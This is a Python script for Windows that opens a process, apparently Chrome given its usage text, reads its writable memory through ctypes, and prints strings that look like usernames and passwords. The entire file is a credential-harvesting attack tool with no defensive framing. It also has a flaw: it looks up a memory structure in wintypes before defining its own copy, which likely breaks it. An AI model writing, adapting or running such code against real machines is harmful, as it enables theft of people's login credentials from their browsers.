import ctypes
import ctypes.wintypes as wintypes
import re
import sys

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04

OpenProcess = ctypes.windll.kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
ReadProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
ReadProcessMemory.restype = wintypes.BOOL

VirtualQueryEx = ctypes.windll.kernel32.VirtualQueryEx
VirtualQueryEx.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, ctypes.POINTER(wintypes.MEMORY_BASIC_INFORMATION), ctypes.c_size_t]
VirtualQueryEx.restype = ctypes.c_size_t

CloseHandle = ctypes.windll.kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", wintypes.LPVOID),
        ("AllocationBase", wintypes.LPVOID),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
    ]

def extract_ascii_strings(data, min_len=3):
    pattern = re.compile(rb'[\x20-\x7E]{%d,}' % min_len)
    return [match.decode('ascii') for match in pattern.findall(data)]

def looks_like_password(s):
    if len(s) < 6 or len(s) > 50:
        return False
    has_lower = any(c.islower() for c in s)
    has_upper = any(c.isupper() for c in s)
    has_digit = any(c.isdigit() for c in s)
    has_special = any(not c.isalnum() for c in s)
    return has_digit and (has_lower or has_upper) and has_special

def looks_like_username(s):
    if len(s) < 3 or len(s) > 50:
        return False
    if '@' in s and '.' in s:
        return True
    if s.isalnum() and 3 <= len(s) <= 30:
        return True
    return False

def read_process_memory_strings(pid):
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not process_handle:
        print(f"[-] Could not open process {pid}")
        return []

    address = 0
    max_address = 0x7FFFFFFF  # 32-bit process; adjust for 64-bit
    strings = []

    mbi = MEMORY_BASIC_INFORMATION()
    while address < max_address:
        if VirtualQueryEx(process_handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
            if mbi.State == MEM_COMMIT and (mbi.Protect & PAGE_READWRITE):
                buffer = ctypes.create_string_buffer(mbi.RegionSize)
                bytesRead = ctypes.c_size_t()
                if ReadProcessMemory(process_handle, ctypes.c_void_p(address), buffer, mbi.RegionSize, ctypes.byref(bytesRead)):
                    region_data = buffer.raw[:bytesRead.value]
                    region_strings = extract_ascii_strings(region_data, min_len=3)
                    strings.extend(region_strings)
            address += mbi.RegionSize
        else:
            break

    CloseHandle(process_handle)
    return strings

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <chrome_pid>")
        sys.exit(1)

    pid = int(sys.argv[1])
    print(f"[+] Reading memory of process PID {pid}")

    all_strings = read_process_memory_strings(pid)
    print(f"[+] Extracted {len(all_strings)} candidate strings")

    usernames = set(filter(looks_like_username, all_strings))
    passwords = set(filter(looks_like_password, all_strings))

    print(f"[+] Possible usernames ({len(usernames)}):")
    for u in usernames:
        print("  ", u)

    print(f"[+] Possible passwords ({len(passwords)}):")
    for p in passwords:
        print("  ", p)

if __name__ == "__main__":
    main()
